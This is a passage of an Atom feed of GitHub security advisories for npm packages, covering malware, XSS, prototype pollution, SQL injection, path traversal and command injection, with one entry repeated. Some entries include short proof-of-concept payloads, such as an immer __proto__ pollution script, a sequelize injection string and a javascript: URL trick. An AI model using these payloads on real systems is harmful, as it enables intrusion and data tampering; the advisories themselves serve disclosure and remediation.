<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2023-09-11T23:01:19.112Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[node-sqlite] node-sqlite is malware]]></title>
        <id>https://github.com/advisories/GHSA-x52f-h74p-9jh8</id>
        <link href="https://github.com/advisories/GHSA-x52f-h74p-9jh8"/>
        <updated>2023-09-11T22:59:55.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>node-sqlite</code> package is a piece of malware that steals environment variables and sends them to attacker controlled locations. </p>
<p>All versions have been unpublished from the npm registry.</p>
<h2 id="recommendation">Recommendation</h2>
<p>As this package is malware, if you find it installed in your environment, the real security concern is determining how it got there. </p>
<p>If you have found this installed in your environment, you should:</p>
<ol>
<li>Delete the package</li>
<li>Clear your npm cache</li>
<li>Ensure it is not present in any other package.json files on your system</li>
<li>Regenerate your registry credentials, tokens, and any other sensitive credentials that may have been present in your environment variables.</li>
</ol>
<p>Additionally, any service which may have been exposed via credentials in your environment variables, such as a database, should be reviewed for indicators of compromise as well.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-16048">https://nvd.nist.gov/vuln/detail/CVE-2017-16048</a></li>
<li><a href="https://github.com/advisories/GHSA-x52f-h74p-9jh8">https://github.com/advisories/GHSA-x52f-h74p-9jh8</a></li>
<li><a href="https://www.npmjs.com/advisories/493">https://www.npmjs.com/advisories/493</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x52f-h74p-9jh8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2018-07-23T21:00:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[raneto] Raneto vulnerable to Cross-site Scripting]]></title>
        <id>https://github.com/advisories/GHSA-vc68-6x72-w22f</id>
        <link href="https://github.com/advisories/GHSA-vc68-6x72-w22f"/>
        <updated>2023-09-11T22:58:57.000Z</updated>
        <content type="html"><![CDATA[<p>Renato v0.17.0 was discovered to contain a cross-site scripting (XSS) vulnerability. This issue is fixed in version 0.17.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-35144">https://nvd.nist.gov/vuln/detail/CVE-2022-35144</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">https://cwe.mitre.org/data/definitions/79.html</a></li>
<li><a href="https://gainsec.com/2022/08/04/cve-2022-35142-cve-2022-35143-cve-2022-35144/">https://gainsec.com/2022/08/04/cve-2022-35142-cve-2022-35143-cve-2022-35144/</a></li>
<li><a href="http://raneto.com/">http://raneto.com/</a></li>
<li><a href="https://github.com/ryanlelek/Raneto/pull/370">https://github.com/ryanlelek/Raneto/pull/370</a></li>
<li><a href="https://github.com/ryanlelek/Raneto/releases/tag/0.17.1">https://github.com/ryanlelek/Raneto/releases/tag/0.17.1</a></li>
<li><a href="https://github.com/advisories/GHSA-vc68-6x72-w22f">https://github.com/advisories/GHSA-vc68-6x72-w22f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc68-6x72-w22f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-05T00:00:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[url-parse] url-parse incorrectly parses hostname / protocol due to unstripped leading control characters.]]></title>
        <id>https://github.com/advisories/GHSA-jf5r-8hm2-f872</id>
        <link href="https://github.com/advisories/GHSA-jf5r-8hm2-f872"/>
        <updated>2023-09-11T22:57:15.000Z</updated>
        <content type="html"><![CDATA[<p>Leading control characters in a URL are not stripped when passed into url-parse. This can cause input URLs to be mistakenly be interpreted as a relative URL without a hostname and protocol, while the WHATWG URL parser will trim control characters and treat it as an absolute URL.</p>
<p>If url-parse is used in security decisions involving the hostname / protocol, and the input URL is used in a client which uses the WHATWG URL parser, the decision may be incorrect.</p>
<p>This can also lead to a cross-site scripting (XSS) vulnerability if url-parse is used to check for the javascript: protocol in URLs. See following example:</p>
<pre><code class="language-js">const parse = require('url-parse')
const express = require('express')
const app = express()
const port = 3000

url = parse(\"\\bjavascript:alert(1)\")

console.log(url)

app.get('/', (req, res) =&gt; {
 if (url.protocol !== \"javascript:\") {res.send(\"&lt;a href=\\'\" + url.href + \"\\'&gt;CLICK ME!&lt;/a&gt;\")}
 })

app.listen(port, () =&gt; {
 console.log(`Example app listening on port ${port}`)
 })
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0691">https://nvd.nist.gov/vuln/detail/CVE-2022-0691</a></li>
<li><a href="https://github.com/unshiftio/url-parse/commit/0e3fb542d60ddbf6933f22eb9b1e06e25eaa5b63">https://github.com/unshiftio/url-parse/commit/0e3fb542d60ddbf6933f22eb9b1e06e25eaa5b63</a></li>
<li><a href="https://huntr.dev/bounties/57124ed5-4b68-4934-8325-2c546257f2e4">https://huntr.dev/bounties/57124ed5-4b68-4934-8325-2c546257f2e4</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20220325-0006/">https://security.netapp.com/advisory/ntap-20220325-0006/</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2023/02/msg00030.html">https://lists.debian.org/debian-lts-announce/2023/02/msg00030.html</a></li>
<li><a href="https://github.com/advisories/GHSA-jf5r-8hm2-f872">https://github.com/advisories/GHSA-jf5r-8hm2-f872</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jf5r-8hm2-f872</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-02-22T00:00:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[url-parse] url-parse Incorrectly parses URLs that include an '@']]></title>
        <id>https://github.com/advisories/GHSA-8v38-pw62-9cw2</id>
        <link href="https://github.com/advisories/GHSA-8v38-pw62-9cw2"/>
        <updated>2023-09-11T22:51:44.000Z</updated>
        <content type="html"><![CDATA[<p>A specially crafted URL with an '@' sign but empty user info and no hostname, when parsed with url-parse, url-parse will return the incorrect href. In particular,</p>
<pre><code class="language-js">parse(\"http://@/127.0.0.1\")
</code></pre>
<p>Will return:</p>
<pre><code class="language-yaml">{
 slashes: true,
 protocol: 'http:',
 hash: '',
 query: '',
 pathname: '/127.0.0.1',
 auth: '',
 host: '',
 port: '',
 hostname: '',
 password: '',
 username: '',
 origin: 'null',
 href: 'http:///127.0.0.1'
 }
</code></pre>
<p>If the 'hostname' or 'origin' attributes of the output from url-parse are used in security decisions and the final 'href' attribute of the output is then used to make a request, the decision may be incorrect.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0639">https://nvd.nist.gov/vuln/detail/CVE-2022-0639</a></li>
<li><a href="https://github.com/unshiftio/url-parse/commit/ef45a1355375a8244063793a19059b4f62fc8788">https://github.com/unshiftio/url-parse/commit/ef45a1355375a8244063793a19059b4f62fc8788</a></li>
<li><a href="https://huntr.dev/bounties/83a6bc9a-b542-4a38-82cd-d995a1481155">https://huntr.dev/bounties/83a6bc9a-b542-4a38-82cd-d995a1481155</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2023/02/msg00030.html">https://lists.debian.org/debian-lts-announce/2023/02/msg00030.html</a></li>
<li><a href="https://github.com/advisories/GHSA-8v38-pw62-9cw2">https://github.com/advisories/GHSA-8v38-pw62-9cw2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8v38-pw62-9cw2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-02-18T00:00:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[immer] Prototype Pollution in immer]]></title>
        <id>https://github.com/advisories/GHSA-9qmh-276g-x5pj</id>
        <link href="https://github.com/advisories/GHSA-9qmh-276g-x5pj"/>
        <updated>2023-09-11T22:48:38.000Z</updated>
        <content type="html"><![CDATA[<h2 id="overview">Overview</h2>
<p>Affected versions of immer are vulnerable to Prototype Pollution.</p>
<h2 id="proof-of-exploit">Proof of exploit</h2>
<pre><code class="language-js">const {applyPatches, enablePatches} = require("immer");
enablePatches();
let obj = {};
console.log("Before : " + obj.polluted);
applyPatches({}, [ { op: 'add', path: [ "__proto__", "polluted" ], value: "yes" } ]);
// applyPatches({}, [ { op: 'replace', path: [ "__proto__", "polluted" ], value: "yes" } ]);
console.log("After : " + obj.polluted);
</code></pre>
<h2 id="remediation">Remediation</h2>
<p>Version 8.0.1 contains a <a href="https://github.com/immerjs/immer/commit/da2bd4fa0edc9335543089fe7d290d6a346c40c5">fix</a> for this vulnerability, updating is recommended.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-28477">https://nvd.nist.gov/vuln/detail/CVE-2020-28477</a></li>
<li><a href="https://github.com/immerjs/immer/issues/738">https://github.com/immerjs/immer/issues/738</a></li>
<li><a href="https://github.com/immerjs/immer/commit/da2bd4fa0edc9335543089fe7d290d6a346c40c5">https://github.com/immerjs/immer/commit/da2bd4fa0edc9335543089fe7d290d6a346c40c5</a></li>
<li><a href="https://github.com/immerjs/immer/blob/master/src/plugins/patches.ts%23L213">https://github.com/immerjs/immer/blob/master/src/plugins/patches.ts%23L213</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1061986">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1061986</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-IMMER-1019369">https://snyk.io/vuln/SNYK-JS-IMMER-1019369</a></li>
<li><a href="https://www.npmjs.com/package/immer">https://www.npmjs.com/package/immer</a></li>
<li><a href="https://github.com/advisories/GHSA-9qmh-276g-x5pj">https://github.com/advisories/GHSA-9qmh-276g-x5pj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9qmh-276g-x5pj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-01-20T21:27:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[socket.io] CORS misconfiguration in socket.io]]></title>
        <id>https://github.com/advisories/GHSA-fxwf-4rqh-v8g3</id>
        <link href="https://github.com/advisories/GHSA-fxwf-4rqh-v8g3"/>
        <updated>2023-09-11T22:46:44.000Z</updated>
        <content type="html"><![CDATA[<p>The package socket.io before 2.4.0 are vulnerable to Insecure Defaults due to CORS Misconfiguration. All domains are whitelisted by default.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-28481">https://nvd.nist.gov/vuln/detail/CVE-2020-28481</a></li>
<li><a href="https://github.com/socketio/socket.io/issues/3671">https://github.com/socketio/socket.io/issues/3671</a></li>
<li><a href="https://github.com/socketio/socket.io/commit/f78a575f66ab693c3ea96ea88429ddb1a44c86c7">https://github.com/socketio/socket.io/commit/f78a575f66ab693c3ea96ea88429ddb1a44c86c7</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-1056358">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-1056358</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1056357">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1056357</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-SOCKETIO-1024859">https://snyk.io/vuln/SNYK-JS-SOCKETIO-1024859</a></li>
<li><a href="https://github.com/advisories/GHSA-fxwf-4rqh-v8g3">https://github.com/advisories/GHSA-fxwf-4rqh-v8g3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fxwf-4rqh-v8g3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-01-20T21:22:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-forge] Open Redirect in node-forge]]></title>
        <id>https://github.com/advisories/GHSA-8fr3-hfg3-gpgp</id>
        <link href="https://github.com/advisories/GHSA-8fr3-hfg3-gpgp"/>
        <updated>2023-09-11T22:42:43.000Z</updated>
        <content type="html"><![CDATA[<p>parseUrl functionality in node-forge mishandles certain uses of backslash such as <code>https:/\/\/\</code> and interprets the URI as a relative path. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0122">https://nvd.nist.gov/vuln/detail/CVE-2022-0122</a></li>
<li><a href="https://github.com/digitalbazaar/forge/commit/db8016c805371e72b06d8e2edfe0ace0df934a5e">https://github.com/digitalbazaar/forge/commit/db8016c805371e72b06d8e2edfe0ace0df934a5e</a></li>
<li><a href="https://huntr.dev/bounties/41852c50-3c6d-4703-8c55-4db27164a4ae">https://huntr.dev/bounties/41852c50-3c6d-4703-8c55-4db27164a4ae</a></li>
<li><a href="https://github.com/advisories/GHSA-8fr3-hfg3-gpgp">https://github.com/advisories/GHSA-8fr3-hfg3-gpgp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8fr3-hfg3-gpgp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-01-21T23:36:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[unzipper] Arbitrary File Write via Archive Extraction in unzipper]]></title>
        <id>https://github.com/advisories/GHSA-884w-698f-927f</id>
        <link href="https://github.com/advisories/GHSA-884w-698f-927f"/>
        <updated>2023-09-11T22:41:23.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of <code>unzipper</code> before 0.8.13 are vulnerable to arbitrary file write when used to extract a specifically crafted archive that contains path traversal filenames (<code>../../file.txt</code> for example).</p>
<h2 id="recommendation">Recommendation</h2>
<p>Update to version 0.3.18 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1002203">https://nvd.nist.gov/vuln/detail/CVE-2018-1002203</a></li>
<li><a href="https://github.com/ZJONSSON/node-unzipper/pull/59">https://github.com/ZJONSSON/node-unzipper/pull/59</a></li>
<li><a href="https://hackerone.com/reports/362119">https://hackerone.com/reports/362119</a></li>
<li><a href="https://github.com/advisories/GHSA-884w-698f-927f">https://github.com/advisories/GHSA-884w-698f-927f</a></li>
<li><a href="https://snyk.io/research/zip-slip-vulnerability">https://snyk.io/research/zip-slip-vulnerability</a></li>
<li><a href="https://www.npmjs.com/advisories/680">https://www.npmjs.com/advisories/680</a></li>
<li><a href="https://github.com/ZJONSSON/node-unzipper/commit/2220ddd5b58f6252069a4f99f9475441ad0b50cd">https://github.com/ZJONSSON/node-unzipper/commit/2220ddd5b58f6252069a4f99f9475441ad0b50cd</a></li>
<li><a href="https://github.com/snyk/zip-slip-vulnerability">https://github.com/snyk/zip-slip-vulnerability</a></li>
<li><a href="https://snyk.io/vuln/npm:unzipper:20180415">https://snyk.io/vuln/npm:unzipper:20180415</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-884w-698f-927f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2018-07-27T17:06:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cloudpub-redis] cloudpub-redis downloads Resources over HTTP]]></title>
        <id>https://github.com/advisories/GHSA-gf8v-vxf9-7c66</id>
        <link href="https://github.com/advisories/GHSA-gf8v-vxf9-7c66"/>
        <updated>2023-09-11T22:40:38.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of <code>cloudpub-redis</code> insecurely download an executable over an unencrypted HTTP connection. </p>
<p>In scenarios where an attacker has a privileged network position, it is possible to intercept the response and replace the executable with a malicious one, resulting in code execution on the system running <code>cloudpub-redis</code>.</p>
<h2 id="recommendation">Recommendation</h2>
<p>No patch is currently available for this vulnerability.</p>
<p>The best mitigation is currently to avoid using this package, using a different package if available. </p>
<p>Alternatively, the risk of exploitation can be reduced by ensuring that this package is not installed while connected to a public network. If the package is installed on a private network, the only people who can exploit this vulnerability are those who have compromised your network or those who have privileged access to your ISP, such as Nation State Actors or Rogue ISP Employees.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-10672">https://nvd.nist.gov/vuln/detail/CVE-2016-10672</a></li>
<li><a href="https://github.com/advisories/GHSA-gf8v-vxf9-7c66">https://github.com/advisories/GHSA-gf8v-vxf9-7c66</a></li>
<li><a href="https://www.npmjs.com/advisories/282">https://www.npmjs.com/advisories/282</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gf8v-vxf9-7c66</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2019-02-18T23:44:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sequelize] SQL Injection in sequelize]]></title>
        <id>https://github.com/advisories/GHSA-m9jw-237r-gvfv</id>
        <link href="https://github.com/advisories/GHSA-m9jw-237r-gvfv"/>
        <updated>2023-09-11T22:39:40.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of <code>sequelize</code> are vulnerable to SQL Injection. The function <code>sequelize.json()</code> incorrectly formatted sub paths for JSON queries, which allows attackers to inject SQL statements and execute arbitrary SQL queries if user input is passed to the query.  Exploitation example:  </p>
<pre><code class="language-js">return User.findAll({
  where: this.sequelize.json("data.id')) AS DECIMAL) = 1 DELETE YOLO INJECTIONS; -- ", 1)
});
</code></pre>
<h2 id="recommendation">Recommendation</h2>
<p>If you are using <code>sequelize</code> 5.x, upgrade to version 5.15.1 or later.
If you are using <code>sequelize</code> 4.x, upgrade to version 4.44.3 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-10752">https://nvd.nist.gov/vuln/detail/CVE-2019-10752</a></li>
<li><a href="https://github.com/sequelize/sequelize/commit/9bd0bc1,">https://github.com/sequelize/sequelize/commit/9bd0bc1,</a></li>
<li><a href="https://github.com/sequelize/sequelize/commit/9bd0bc111b6f502223edf7e902680f7cc2ed541e">https://github.com/sequelize/sequelize/commit/9bd0bc111b6f502223edf7e902680f7cc2ed541e</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-SEQUELIZE-459751,">https://snyk.io/vuln/SNYK-JS-SEQUELIZE-459751,</a></li>
<li><a href="https://github.com/sequelize/sequelize/pull/11329">https://github.com/sequelize/sequelize/pull/11329</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-SEQUELIZE-459751">https://snyk.io/vuln/SNYK-JS-SEQUELIZE-459751</a></li>
<li><a href="https://www.npmjs.com/advisories/1146">https://www.npmjs.com/advisories/1146</a></li>
<li><a href="https://github.com/advisories/GHSA-m9jw-237r-gvfv">https://github.com/advisories/GHSA-m9jw-237r-gvfv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m9jw-237r-gvfv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2019-10-25T19:43:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sequelize] SQL Injection in sequelize]]></title>
        <id>https://github.com/advisories/GHSA-m9jw-237r-gvfv</id>
        <link href="https://github.com/advisories/GHSA-m9jw-237r-gvfv"/>
        <updated>2023-09-11T22:39:40.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of <code>sequelize</code> are vulnerable to SQL Injection. The function <code>sequelize.json()</code> incorrectly formatted sub paths for JSON queries, which allows attackers to inject SQL statements and execute arbitrary SQL queries if user input is passed to the query.  Exploitation example:  </p>
<pre><code class="language-js">return User.findAll({
  where: this.sequelize.json("data.id')) AS DECIMAL) = 1 DELETE YOLO INJECTIONS; -- ", 1)
});
</code></pre>
<h2 id="recommendation">Recommendation</h2>
<p>If you are using <code>sequelize</code> 5.x, upgrade to version 5.15.1 or later.
If you are using <code>sequelize</code> 4.x, upgrade to version 4.44.3 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-10752">https://nvd.nist.gov/vuln/detail/CVE-2019-10752</a></li>
<li><a href="https://github.com/sequelize/sequelize/commit/9bd0bc1,">https://github.com/sequelize/sequelize/commit/9bd0bc1,</a></li>
<li><a href="https://github.com/sequelize/sequelize/commit/9bd0bc111b6f502223edf7e902680f7cc2ed541e">https://github.com/sequelize/sequelize/commit/9bd0bc111b6f502223edf7e902680f7cc2ed541e</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-SEQUELIZE-459751,">https://snyk.io/vuln/SNYK-JS-SEQUELIZE-459751,</a></li>
<li><a href="https://github.com/sequelize/sequelize/pull/11329">https://github.com/sequelize/sequelize/pull/11329</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-SEQUELIZE-459751">https://snyk.io/vuln/SNYK-JS-SEQUELIZE-459751</a></li>
<li><a href="https://www.npmjs.com/advisories/1146">https://www.npmjs.com/advisories/1146</a></li>
<li><a href="https://github.com/advisories/GHSA-m9jw-237r-gvfv">https://github.com/advisories/GHSA-m9jw-237r-gvfv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m9jw-237r-gvfv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2019-10-25T19:43:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[http-server-node] Path Traversal in http-server-node]]></title>
        <id>https://github.com/advisories/GHSA-hj3m-v758-jwx5</id>
        <link href="https://github.com/advisories/GHSA-hj3m-v758-jwx5"/>
        <updated>2023-09-11T22:36:15.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of package http-server-node are vulnerable to Directory Traversal via use of <code>--path-as-is</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-23797">https://nvd.nist.gov/vuln/detail/CVE-2021-23797</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-HTTPSERVERNODE-1727656">https://snyk.io/vuln/SNYK-JS-HTTPSERVERNODE-1727656</a></li>
<li><a href="https://github.com/advisories/GHSA-hj3m-v758-jwx5">https://github.com/advisories/GHSA-hj3m-v758-jwx5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hj3m-v758-jwx5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-01-05T15:02:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[react-draft-wysiwyg] Cross-site Scripting in React Draft Wysiwyg]]></title>
        <id>https://github.com/advisories/GHSA-qcg2-h349-vwm3</id>
        <link href="https://github.com/advisories/GHSA-qcg2-h349-vwm3"/>
        <updated>2023-09-11T22:34:32.000Z</updated>
        <content type="html"><![CDATA[<p>react-draft-wysiwyg (aka React Draft Wysiwyg) before 1.14.6 allows a <code>javascript:</code> URi in a Link Target of the link decorator in <code>decorators/Link/index.js</code> when a draft is shared across users, leading to XSS.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-31712">https://nvd.nist.gov/vuln/detail/CVE-2021-31712</a></li>
<li><a href="https://github.com/jpuri/react-draft-wysiwyg/issues/1102">https://github.com/jpuri/react-draft-wysiwyg/issues/1102</a></li>
<li><a href="https://github.com/jpuri/react-draft-wysiwyg/pull/1104">https://github.com/jpuri/react-draft-wysiwyg/pull/1104</a></li>
<li><a href="https://github.com/jpuri/react-draft-wysiwyg/commit/d2faeb612b53f10dff048de7dc57e1f4044b5380">https://github.com/jpuri/react-draft-wysiwyg/commit/d2faeb612b53f10dff048de7dc57e1f4044b5380</a></li>
<li><a href="https://github.com/advisories/GHSA-qcg2-h349-vwm3">https://github.com/advisories/GHSA-qcg2-h349-vwm3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qcg2-h349-vwm3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-05-06T15:52:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[immer] Prototype Pollution in immer]]></title>
        <id>https://github.com/advisories/GHSA-33f9-j839-rf8h</id>
        <link href="https://github.com/advisories/GHSA-33f9-j839-rf8h"/>
        <updated>2023-09-11T22:29:54.000Z</updated>
        <content type="html"><![CDATA[<p>This affects the package immer before 9.0.6. A type confusion vulnerability can lead to a bypass of CVE-2020-28477 when the user-provided keys used in the path parameter are arrays. In particular, this bypass is possible because the condition <code>(p === "__proto__" || p === "constructor")</code> in <code>applyPatches_</code> returns false if <code>p</code> is <code>['__proto__']</code> (or <code>['constructor']</code>). The <code>===</code> operator (strict equality operator) returns false if the operands have different type.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-23436">https://nvd.nist.gov/vuln/detail/CVE-2021-23436</a></li>
<li><a href="https://github.com/immerjs/immer/commit/fa671e55ee9bd42ae08cc239102b665a23958237">https://github.com/immerjs/immer/commit/fa671e55ee9bd42ae08cc239102b665a23958237</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-IMMER-1540542">https://snyk.io/vuln/SNYK-JS-IMMER-1540542</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1579266">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1579266</a></li>
<li><a href="https://github.com/advisories/GHSA-33f9-j839-rf8h">https://github.com/advisories/GHSA-33f9-j839-rf8h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-33f9-j839-rf8h</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2021-09-02T17:17:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[shell-quote] Improper Neutralization of Special Elements used in a Command in Shell-quote]]></title>
        <id>https://github.com/advisories/GHSA-g4rg-993r-mgx7</id>
        <link href="https://github.com/advisories/GHSA-g4rg-993r-mgx7"/>
        <updated>2023-09-11T22:27:16.000Z</updated>
        <content type="html"><![CDATA[<p>The shell-quote package before 1.7.3 for Node.js allows command injection. An attacker can inject unescaped shell metacharacters through a regex designed to support Windows drive letters. If the output of this package is passed to a real shell as a quoted argument to a command with <code>exec()</code>, an attacker can inject arbitrary commands. This is because the Windows drive letter regex character class is <code>{A-z]</code> instead of the correct <code>{A-Za-z]</code>. Several shell metacharacters exist in the space between capital letter Z and lower case letter a, such as the backtick character.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-42740">https://nvd.nist.gov/vuln/detail/CVE-2021-42740</a></li>
<li><a href="https://www.npmjs.com/package/shell-quote">https://www.npmjs.com/package/shell-quote</a></li>
<li><a href="https://github.com/ljharb/shell-quote/commit/5799416ed454aa4ec9afafc895b4e31760ea1abe">https://github.com/ljharb/shell-quote/commit/5799416ed454aa4ec9afafc895b4e31760ea1abe</a></li>
<li><a href="https://github.com/ljharb/shell-quote/blob/master/CHANGELOG.md#173">https://github.com/ljharb/shell-quote/blob/master/CHANGELOG.md#173</a></li>
<li><a href="https://github.com/advisories/GHSA-g4rg-993r-mgx7">https://github.com/advisories/GHSA-g4rg-993r-mgx7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g4rg-993r-mgx7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-24T19:18:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[docker-compose-remote-api] OS Command Injection in docker-compose-remote-api]]></title>
        <id>https://github.com/advisories/GHSA-q6pj-jh94-5fpr</id>
        <link href="https://github.com/advisories/GHSA-q6pj-jh94-5fpr"/>
        <updated>2023-09-11T22:26:16.000Z</updated>
        <content type="html"><![CDATA[<p>docker-compose-remote-api through 0.1.4 allows execution of arbitrary commands. Within <code>index.js</code> of the package, the function <code>exec(serviceName, cmd, fnStdout, fnStderr, fnExit)</code> uses the variable <code>serviceName</code> which can be controlled by users without any sanitization.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-7606">https://nvd.nist.gov/vuln/detail/CVE-2020-7606</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-DOCKERCOMPOSEREMOTEAPI-560125">https://snyk.io/vuln/SNYK-JS-DOCKERCOMPOSEREMOTEAPI-560125</a></li>
<li><a href="https://github.com/advisories/GHSA-q6pj-jh94-5fpr">https://github.com/advisories/GHSA-q6pj-jh94-5fpr</a></li>
